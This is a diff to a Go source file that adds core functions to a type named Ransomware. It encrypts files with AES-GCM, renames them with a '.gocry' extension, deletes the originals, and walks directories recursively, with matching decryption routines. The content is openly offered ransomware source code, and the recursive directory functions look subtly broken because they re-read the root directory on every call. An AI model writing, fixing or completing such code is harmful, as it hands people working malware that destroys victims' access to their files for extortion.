@@ -59,8 +59,79 @@ func (rw *Ransomware) encryptSingleFile(path string) {
 		log.Fatal(err.Error())
 	}
 
-	if err := ioutil.WriteFile("path"+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
+	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
 		log.Fatal(err)
+	}
+
+	if err := os.Remove(path); err != nil {
+		log.Fatal(err)
+	}
+}
+
+func (rw *Ransomware) decryptSingleFile(path string) {
+	data, err := ioutil.ReadFile(path)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	block, err := aes.NewCipher(rw.key)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
+	nonceSize := gcm.NonceSize()
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
+	// path[:len(path)-6] removes the .gocry extension from the filename -> test.png.gocry -> test.png
+	if err := ioutil.WriteFile(path[:len(path)-6], plaintext, 0666); err != nil {
+		log.Fatal(err)
+	}
+
+	if err := os.Remove(path); err != nil {
+		log.Fatal(err)
+	}
+}
+
+// This function is used recursively to encrypt all the subdirectories, and the files
+// in those directores
+func (rw *Ransomware) encryptDirectory(path string) {
+	files, err := ioutil.ReadDir(rw.rootDir)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for _, f := range files {
+		if f.IsDir() {
+			rw.encryptDirectory(path + "/" + f.Name())
+		} else {
+			rw.encryptSingleFile(path + "/" + f.Name())
+		}
+	}
+}
+
+// This function is used recursively to decrypt all the subdirectories, and the files
+// in those directores
+func (rw *Ransomware) decryptDirectory(path string) {
+	files, err := ioutil.ReadDir(rw.rootDir)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for _, f := range files {
+		if f.IsDir() {
+			rw.decryptDirectory(path + "/" + f.Name())
+		} else {
+			rw.decryptSingleFile(path + "/" + f.Name())
+		}
 	}
 }
 
